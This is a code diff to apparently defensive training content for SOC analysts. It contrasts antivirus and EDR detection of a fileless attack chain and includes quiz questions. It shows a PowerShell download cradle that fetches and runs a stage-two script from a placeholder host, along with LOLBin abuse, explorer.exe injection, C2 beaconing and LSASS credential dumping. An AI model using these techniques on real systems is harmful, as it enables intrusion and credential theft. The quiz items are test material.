@@ -235,6 +235,7 @@ const avVsEdrMasterclass = {
         "Every SOC analyst must know these LOLBins and what attackers use them for:\n\n" +
         "powershell.exe: The most abused LOLBin. Can download files, execute code from memory, interact with COM objects, query WMI, and access .NET classes. The -enc flag allows base64-encoded command payloads. cmd.exe: Basic command execution, pipe chaining, launching other LOLBins. wscript.exe and cscript.exe: Execute VBScript and JScript files. Attackers email .vbs or .js attachments that run via wscript. mshta.exe: Executes HTML Applications (.hta files), which are full-featured scripts with COM access. Attackers host malicious HTA files on their servers and make victims run them. regsvr32.exe: Registers COM DLLs, but can also download and execute a remote scriptlet file via the /s /n /u /i:[URL] flags, this bypasses application whitelisting. certutil.exe: A certificate management tool that can decode base64 files (certutil -decode malware.b64 malware.exe) and download files from URLs. bitsadmin.exe: The Background Intelligent Transfer Service command-line tool, used by Windows Update, abused to download files in the background. wmic.exe: Windows Management Instrumentation command line, can execute processes, query system information, and even execute remote commands. rundll32.exe: Loads and executes DLL files, including executing specific exported functions. Attackers use it to run malicious DLLs without dropping a standalone .exe; the process is rundll32.exe, so check its command line and DLL path.\n\n" +
         "The attack chain using LOLBins typically looks like this: a user opens a malicious Word document with an embedded macro. The macro is not blocked by AV because it runs inside WINWORD.EXE. The macro calls out to PowerShell using a base64-encoded, hidden command string. PowerShell connects to the attacker's server and downloads a payload, but into memory, not to disk. The payload runs inside PowerShell's process. Everything that happened was carried out by signed, trusted Microsoft tools. AV sees nothing suspicious.\n\n" +
+        "Attackers often go one step further and inject that payload into another running process, such as explorer.exe, the Windows desktop shell. Explorer.exe normally runs for as long as the user stays logged on, under that user's own account and not as SYSTEM, so the injected code keeps running after powershell.exe is closed or killed, and its network traffic appears to come from a trusted Windows program.\n\n" +
         "This is why EDR was invented. EDR does not just scan files. It watches what processes do, who spawns what, what network connections are made, and what data is accessed. When PowerShell is spawned by Word and immediately connects to an external IP, an EDR flags this as suspicious regardless of whether there are any malicious files on disk.",
       codeExample:
         "LOLBIN ATTACK CHAIN: OFFICE MACRO -> FILELESS EXECUTION\n" +
@@ -255,7 +256,7 @@ const avVsEdrMasterclass = {
         "  AV STATUS: powershell.exe is trusted -> NO DETECTION\n\n" +
         "STEP 3, In-Memory Download Cradle (decoded payload)\n" +
         "  IEX(New-Object Net.WebClient).DownloadString(\n" +
-        "    'http://185.220.101.50/stage2.ps1'\n" +
+        "    'http://203.0.113.50/stage2.ps1'\n" +
         "  )\n" +
         "  Payload downloaded into memory, never written to disk.\n" +
         "  AV STATUS: No file to scan -> NO DETECTION\n\n" +
@@ -265,7 +266,7 @@ const avVsEdrMasterclass = {
         "  AV STATUS: No new file, no signature match -> NO DETECTION\n\n" +
         "STEP 5: C2 Communication\n" +
         "  Shellcode in explorer.exe connects to C2 server\n" +
-        "  Beacon: every 60 seconds, HTTPS to 185.220.101.50:443\n" +
+        "  Beacon: every 60 seconds, HTTPS to 203.0.113.50:443\n" +
         "  AV STATUS: explorer.exe is trusted -> NO DETECTION\n\n" +
         "EDR STATUS (if deployed):\n" +
         "  ALERT: Word spawning PowerShell with -enc flag\n" +
@@ -343,7 +344,7 @@ const avVsEdrMasterclass = {
         "  [ALERT] Office application spawning PowerShell with -enc\n\n" +
         "STREAM 2: NETWORK EVENTS\n" +
         "  ts=11:27:47  powershell.exe (pid 9944)\n" +
-        "               dst=185.220.101.50:443 proto=tcp bytes_out=412\n" +
+        "               dst=203.0.113.50:443 proto=tcp bytes_out=412\n" +
         "  [ALERT] PowerShell making outbound HTTPS connection\n\n" +
         "STREAM 3: MEMORY OPERATION EVENTS\n" +
         "  ts=11:27:51  powershell.exe (pid 9944)\n" +
@@ -538,7 +539,7 @@ const avVsEdrMasterclass = {
         "  |   Static AI score: 0.94 (MALICIOUS)\n" +
         "  |   |\n" +
         "  |   +-- [NETWORK EVENT]\n" +
-        "  |   |   dst: 185.220.101.50:443\n" +
+        "  |   |   dst: 203.0.113.50:443\n" +
         "  |   |   bytes_out: 412 | Downloaded: stage2 payload\n" +
         "  |   |\n" +
         "  | +-- [MEMORY INJECTION EVENT: CRITICAL]\n" +
@@ -549,13 +550,13 @@ const avVsEdrMasterclass = {
         "  |\n" +
         "  +-- [INJECTED CODE, running in explorer.exe]\n" +
         "      [NETWORK EVENT]\n" +
-        "      dst: 185.220.101.50:443\n" +
+        "      dst: 203.0.113.50:443\n" +
         "      C2 beacon every 60 seconds\n\n" +
         "SENTINELONE AUTOMATED RESPONSE:\n" +
         "  11:27:52 - powershell.exe (pid 9944) KILLED\n" +
         "  11:27:52 - explorer.exe (pid 3128) SUSPENDED\n" +
         "  11:27:53 - No files to rollback (fileless attack)\n" +
-        "  11:27:53 - Network connection to 185.220.101.50 BLOCKED\n" +
+        "  11:27:53 - Network connection to 203.0.113.50 BLOCKED\n" +
         "  11:27:53 - Alert sent to SOC: Storyline S1-STR-20240918-9f3a2b1c\n\n" +
         "ANALYST VIEW:\n" +
         "  One click on the Storyline ID shows the complete attack tree above.\n" +
@@ -635,13 +636,13 @@ const avVsEdrMasterclass = {
         "What does an access mask of 0x1FFFFF (Falcon's crowdstrike.DesiredAccess 2097151) mean in a CrowdStrike EDR alert about LSASS access?",
       options: [
         "PROCESS_VM_READ only: the process can read LSASS memory but cannot write to it or create threads in it",
-        "PROCESS_ALL_ACCESS was granted: the process has full control over LSASS, enough to dump its credential material",
+        "PROCESS_ALL_ACCESS was requested: the process asked for full control over LSASS, enough to dump its credential material",
         "PROCESS_QUERY_LIMITED_INFORMATION: the process can enumerate LSASS metadata but cannot read its memory",
         "The request was logged but blocked by Credential Guard: 0x1FFFFF marks the denied attempt",
       ],
       answer: 1,
       explanation:
-        "The access mask 0x1FFFFF (2097151 in Falcon's decimal DesiredAccess field) is the hexadecimal value for PROCESS_ALL_ACCESS in Windows. This grants the caller ALL possible permissions over the target process (in this case LSASS). With PROCESS_ALL_ACCESS, an attacker can use MiniDumpWriteDump() to dump all credentials stored in LSASS memory, extracting NTLM hashes and Kerberos tickets. This is the LSASS credential dumping technique (MITRE T1003.001). Any process accessing LSASS with GrantedAccess 0x1FFFFF should be treated as credential dumping until proven otherwise.",
+        "The access mask 0x1FFFFF (2097151 in Falcon's decimal DesiredAccess field) is the hexadecimal value for PROCESS_ALL_ACCESS in Windows: ALL possible permissions over the target process (in this case LSASS). DesiredAccess records what the caller asked for, and Windows checks that request before it hands over a handle, so this field alone does not prove the access was granted. If it is granted, an attacker can use MiniDumpWriteDump() to dump credentials stored in LSASS memory, extracting NTLM hashes and Kerberos tickets. This is the LSASS credential dumping technique (MITRE T1003.001). Any process requesting 0x1FFFFF on LSASS should be treated as credential dumping until proven otherwise.",
       xp: 25,
     },
 
@@ -720,7 +721,7 @@ const avVsEdrMasterclass = {
         },
         {
           question:
-            "The detection's technique is Process Injection, with PowerShell holding full access to explorer.exe. Why would an attacker move its code into explorer.exe rather than keep running inside powershell.exe?",
+            "The detection's technique is Process Injection, with PowerShell requesting full access to explorer.exe. Why would an attacker move its code into explorer.exe rather than keep running inside powershell.exe?",
           options: [
             "To gain SYSTEM rights, since explorer.exe runs as SYSTEM on every host",
             "To live in a trusted, long-running process that survives killing PowerShell",
